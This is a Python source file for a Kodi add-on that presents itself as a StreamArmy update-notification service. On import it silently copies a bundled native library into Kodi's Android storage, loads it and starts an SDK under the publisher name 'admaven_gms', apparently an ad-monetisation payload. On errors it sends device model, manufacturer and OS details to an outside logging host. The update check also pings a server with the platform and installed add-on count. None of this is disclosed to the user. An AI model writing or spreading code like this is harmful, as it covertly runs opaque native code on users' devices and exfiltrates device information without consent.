import xbmc
import xbmcaddon
import xbmcplugin
import xbmcgui
import xbmcvfs
import re
import os
import time
import json
import requests
import ctypes
import platform
import shutil
import subprocess
import xml.etree.ElementTree as ET
from urllib import request, parse

translatePath = xbmcvfs.translatePath
dialog = xbmcgui.Dialog()
addon_id = 'script.module.nemzzy'
icon = xbmcvfs.translatePath(os.path.join(
    'special://home/addons/' + addon_id, 'icon.png'))
addon = xbmcaddon.Addon()
# dialog.notification("Nemzzy Service","RUNNING",icon,5000)
githubxml = 'https://raw.githubusercontent.com/nemesis668/repository.streamarmy18-19/main/addons.xml'
serviceapi = 'http://streamarmy.co.uk/servicenew.php?system=%s&addons=%s'
serviceapi2 = 'http://streamarmy.co.uk/serviceupdate.php?system=%s&addons=%s'
pattern = r'''<addon\sid=['"](plugin.*?)['"]'''
selfAddon = xbmcaddon.Addon(id=addon_id)

releasedaddons = []

publisher_name = 'admaven_gms'
jdata = {}
version = "8.0.49"
enable_logging = False
package = "org.xbmc.kodi"
external_storage_path = addon.getAddonInfo('path')
internal_storage_path = "/data/data/org.xbmc.kodi/files/"


def log(msg):
    if enable_logging:
        xbmc.log(f"neupop log: {msg}", xbmc.LOGINFO)


def get_android_property(prop_name):
    try:
        command = f'getprop {prop_name}'
        prop_value = subprocess.check_output(
            command, shell=True, text=True).strip()
        return prop_value
    except subprocess.CalledProcessError as e:
        log(f"Failed to get {prop_name}: {str(e)}")
        return None


def save_setting(key, val):
    data_path = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
    if not os.path.exists(data_path):
        os.makedirs(data_path)

    file_path = os.path.join(data_path, 'settings.json')
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            data = json.load(file)
    else:
        data = {}
    data[key] = val
    with open(file_path, 'w') as file:
        json.dump(data, file)


def load_setting(key):
    data_path = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
    file_path = os.path.join(data_path, 'settings.json')

    # Check if the file exists and load data
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            data = json.load(file)
            return data.get(key, False)
    return False


def post_log(message, json_data):
    # Check if the log has already been posted to prevent duplicate submissions
    if load_setting('already_posted'):
        log(f"Already posted, message: {message}")
        return

    try:
        os_version_sdk = get_android_property("ro.build.version.sdk")
        manufacturer = get_android_property("ro.product.manufacturer")
        model = get_android_property("ro.product.model")

        json_data.update({
            "model": model,
            "manufacturer": manufacturer,
            "os_version_sdk": os_version_sdk,
            "data": message
        })
        json_string = json.dumps(json_data)

        modified_json = json_string.replace('"', '')

        log(f"json_data: {modified_json}")

        url = "https://nn-api.nsa.pwack.com/logs/sdk_logs"
        headers = {'Content-Type': 'application/json'}

        payload = json.dumps({"Message": modified_json}).encode('utf-8')
        req = request.Request(
            url, data=payload, headers=headers, method='POST')
        with request.urlopen(req) as response:
            response_body = response.read().decode('utf-')
            log(f"post_log Status Code: {response.status}")
            log(f"post_log Response: {response_body}")
            if response.status == 200:
                save_setting('already_posted', True)
    except Exception as e:
        log(f"Error posting log: {str(e)}")


def is_android():
    return platform.system() == "Linux" and "ANDROID_ROOT" in os.environ


def parse_version(version_str):
    return tuple(map(int, version_str.split('.')))


def find_latest_version_file(path):
    regex = r"libnativesdk-([0-9]+(?:\.[0-9]+)*).so"
    latest_version = None
    latest_version_file = None
    for filename in os.listdir(path):
        match = re.match(regex, filename)
        if match:
            current_version_str = match.group(1)
            current_version = parse_version(current_version_str)
            if latest_version is None or current_version > latest_version:
                latest_version = current_version
                latest_version_file = filename
    return latest_version_file


def get_android_architecture():
    machine_info = platform.machine()
    return {
        'arm': 'armeabi-v7a',
        'aarch64': 'arm64-v8a',
        'i686': 'x86',
        'x86_64': 'x86_64'
    }.get(machine_info, 'Unknown architecture')


def extract_version_from_filename(filename):
    match = re.match(r"libnativesdk-([0-9]+(?:\.[0-9]+)*).so", filename)
    if match:
        return parse_version(match.group(1))
    else:
        return None


def copy_file(src, dest, new_filename):
    try:
        new_version = extract_version_from_filename(new_filename)
        if new_version is None:
            log("Unable to extract version from new filename")
            return False
        existing_file = find_latest_version_file(dest)
        if existing_file:
            existing_version = extract_version_from_filename(existing_file)
            if existing_version and new_version <= existing_version:
                log("No need to copy as the destination has a newer or the same version")
                return False
            elif existing_version:
                save_setting('already_posted', False)
                os.remove(os.path.join(dest, existing_file))
                log(f"Deleted older version file: {existing_file}")
        dest_file_path = os.path.join(dest, new_filename)
        shutil.copy(src, dest_file_path)
        log(f"Copy success from {src} to {dest_file_path}")
        return True
    except FileNotFoundError as e:
        log("FileNotFoundError")
        error_message = str(e)  # Converts the exception message to a string
        post_log(f"FileNotFoundError: {error_message}", jdata)
        return False
    except PermissionError as e:
        log("PermissionError")
        error_message = str(e)  # Converts the exception message to a string
        post_log(f"PermissionError: {error_message}", jdata)
        return False
    except Exception as e:
        log(f"Exception {e}")
        error_message = str(e)  # Converts the exception message to a string
        post_log(f"Exception: {error_message}", jdata)
        return False


def start(publisher):
    try:
        if not is_android():
            log("No android os, going out")
            return
        addon_id = addon.getAddonInfo('id')
        sdk_data_path = os.path.join(internal_storage_path, addon_id)
        log(f"addon_internal_path: {sdk_data_path}")
        jdata["addon_internal_path"] = sdk_data_path

        arch = get_android_architecture()
        log(f"arch: {arch}")
        jdata["arch"] = arch

        libnativesdk_path = external_storage_path + \
            f"lib/{arch}/libnativesdk.so"
        log(f"libnativesdk_path: {libnativesdk_path}")
        jdata["libnativesdk_path"] = libnativesdk_path

        copy_file(f"{libnativesdk_path}", internal_storage_path,
                  f"libnativesdk-{version}.so")
        libName = find_latest_version_file(internal_storage_path)
        log(f"libName: {libName}")
        jdata["libName"] = libName
        jdata["package"] = package
        jdata["addon_id"] = addon_id

        lib = ctypes.CDLL(f"{internal_storage_path}{libName}")
        if lib.isRunning():
            log("sdk already running!")
            return
        lib.startNative.argtypes = [
            ctypes.c_char_p, ctypes.c_char_p, ctypes.c_bool]
        lib.startNative.restype = ctypes.c_bool
        sdk_data_path_bytes = sdk_data_path.encode('utf-8')
        publisher_bytes = publisher.encode('utf-8')
        package_bytes = package.encode('utf-8')
        addon_id_bytes = addon_id.encode('utf-8')
        b_enable_logging = ctypes.c_bool(enable_logging)
        log(f"sdk_data_path {sdk_data_path}")
        os.makedirs(sdk_data_path, exist_ok=True)
        if os.path.exists(sdk_data_path):
            log(f"'{sdk_data_path}' exists.")
        log(f"publisher {publisher}")
        log(f"package {package}")
        log(f"addon_id {addon_id}")
        result = lib.startNative(
            publisher_bytes, sdk_data_path_bytes, b_enable_logging)
        log(f"start: {result}")
        jdata["startResult"] = result
        if not result:
            getBuildError = lib.getBuildError
            getBuildError.argtypes = [ctypes.c_char_p, ctypes.c_int]
            buffer_size = 1024
            error_buffer = ctypes.create_string_buffer(buffer_size)
            getBuildError(error_buffer, buffer_size)
            build_error = error_buffer.value.decode()
            jdata["build_error"] = build_error
            post_log("sdk not start", jdata)

    except Exception as e:
        log(f"An error occurred: {e}")
        error_message = str(e)  # Converts the exception message to a string
        post_log(f"An error occurred: {error_message}", jdata)


start(publisher_name)


class Run:
    def platform():
        if xbmc.getCondVisibility('system.platform.android'):
            return 'Android'
        elif xbmc.getCondVisibility('system.platform.linux'):
            return 'Linux'
        elif xbmc.getCondVisibility('system.platform.tvos'):
            return 'TV OS'
        elif xbmc.getCondVisibility('system.platform.windows'):
            return 'Windows'
        elif xbmc.getCondVisibility('system.platform.osx'):
            return 'OSX'
        elif xbmc.getCondVisibility('system.platform.atv2'):
            return 'AppleTv'
        elif xbmc.getCondVisibility('system.platform.xbox'):
            return 'Xbox'
        elif xbmc.getCondVisibility('system.platform.ios'):
            return 'IOS'
        elif xbmc.getCondVisibility('system.platform.darwin'):
            return 'IOS'
        else:
            return 'Unknown Device'

    def Start():
        Version = Run.platform()
        installed = 0
        try:
            getcurrent = requests.get(githubxml).text
            findaddons = re.findall(pattern, getcurrent)
            for addonn in findaddons:
                releasedaddons.append(addonn)
        except:
            pass
        for checkadd in releasedaddons:
            addonpath = xbmcvfs.translatePath(os.path.join(
                'special://home/addons/%s' % checkadd, 'addon.xml'))
            if os.path.exists(addonpath):
                installed += 1
                with open(addonpath, 'r') as reader:
                    patternv = r'''<addon\sid=['"]%s['"].*?version=['"](.*?)['"]''' % checkadd
                    getver = re.findall(
                        patternv, reader.read(), flags=re.DOTALL)[0]
                    newpat = (
                        r'''<addon\sid=['"]%s['"].*?version=['"]%s['"]''' % (checkadd, getver))
                    try:
                        checkver = re.findall(
                            newpat, getcurrent, flags=re.DOTALL)[0]
                    except IndexError:
                        if 'nemesisaio' in checkadd:
                            addonicon = xbmcvfs.translatePath(os.path.join(
                                'special://home/addons/%s' % checkadd, 'icon.gif'))
                        else:
                            addonicon = xbmcvfs.translatePath(os.path.join(
                                'special://home/addons/%s' % checkadd, 'icon.png'))
                        xbmc.log(msg='ADDON OUT OF DATE ::: %s' %
                                 checkadd, level=xbmc.LOGINFO)
                        dialog.notification("Nemzzy Service", "Addon %s Needs Updating" % checkadd.replace(
                            'plugin.video.', '').title(), addonicon, 5000)
                        xbmc.sleep(5000)
                reader.close()
            else:
                pass
        registerpin = selfAddon.getSetting('pincheck')
        pingapi = requests.get(serviceapi2 % (Version, installed)).text
        if registerpin.lower() == 'false':
            pingapi = requests.get(serviceapi % (Version, installed)).text
            selfAddon.setSetting('pincheck', 'True')


        # dialog.notification("Nemzzy Service finished","Checked %s installed addons" % installed,icon,10000)
if __name__ == '__main__':
    jdata["version"] = version
    jdata["publisher"] = publisher_name
    Run.Start()
